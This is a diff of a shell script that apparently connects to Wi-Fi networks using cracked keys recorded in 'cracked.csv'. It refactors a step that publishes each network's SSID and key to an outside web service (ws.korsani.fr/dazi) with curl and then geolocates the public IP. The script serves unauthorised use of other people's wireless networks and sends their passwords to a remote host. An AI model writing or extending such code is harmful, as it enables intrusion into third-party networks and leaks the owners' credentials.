@@ -7,7 +7,7 @@ connect_fail=$(mktemp)
 if=wlan0
 trap "reset_if $if ; rm -f $t $connect_fail" 0
 cracked=$HOME/cracked.csv
-WS_EXPIRATION=36000
+[ -z "$WS_EXPIRATION" ] && WS_EXPIRATION=36000
 function reset_if() {
 	local if=$1
 	dhclient -r $if
@@ -45,6 +45,19 @@ function wait_for_ip() {
 	done
 	echo
 	return 1
+}
+function display() {
+	where="$1"
+	ssid="$2"
+	key="$3"
+	case $where in
+		ws)
+			echo -n "Publication ... expiration is ${WS_EXPIRATION}s"
+			curl -X PATCH -s "http://ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION" -d wifi=$ssid > /dev/null 
+			curl -X POST  -s "http://ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION" -d $ssid=$key > /dev/null && echo 'ok' && echo $bssid >> $t
+			geoiplookup $(curl -s ws.korsani.fr/myip)
+			;;
+	esac
 }
 while [ "$1" != "" ]
 do
@@ -94,10 +107,7 @@ done
 			wait_for_ip || continue
 			echo 'ok'
 			#route add default gw 192.168.0.254
-			echo -n 'Publication ... '
-			curl -X PATCH -s "http://ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION" -d wifi=$ssid > /dev/null 
-			curl -s ws.korsani.fr/dazi/?expiration=$WS_EXPIRATION -d $ssid=$key > /dev/null && echo 'ok' && echo $bssid >> $t
-			geoiplookup $(curl -s ws.korsani.fr/myip)
+			display ws $ssid $key
 			if [ -n "$UPDATE_ME" ]
 			then
 				echo 'Updating myself'
